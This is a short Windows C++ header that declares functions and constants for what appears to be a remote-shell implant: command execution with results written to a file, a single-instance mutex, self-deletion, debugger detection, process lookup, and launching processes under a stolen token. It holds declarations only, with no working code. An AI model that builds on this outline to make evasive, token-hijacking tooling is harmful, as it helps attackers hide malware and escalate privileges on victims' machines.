#pragma once


#include <windows.h>

using namespace std;


#define CMD_RESULT_FILENAME		"cmdResult.txt"

#define MY_MUTEX_NAME				"Global\\MY_MUTEX_SHELLPE_NAME"

#define OPERATION_LOG_FILENAME		"operation.log"

#define RUNNING_LOG_FILENAME		"running.log"


int __stdcall shell(const char* cmd);

int commandline(WCHAR* szparam, int wait, int show, DWORD* ret);

int __cdecl runLog(const WCHAR* format, ...);

int __cdecl runLog(const CHAR* format, ...);

int GetPathFromFullName(char* strFullName, char* strDst);

unsigned short crc16(unsigned char* data, int size);

int suicide();

int getOsBits();

int cpuBits();

int wow64();

int isDebugged();

int binarySearch(const char* data, int size, const char* tag, int tagsize);

HANDLE  bRunning(BOOL* exist);


DWORD getProcNameByPID(DWORD pid, char* procname, int buflen);

DWORD getPidByName(const char* szProcessName);

int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR szparam);

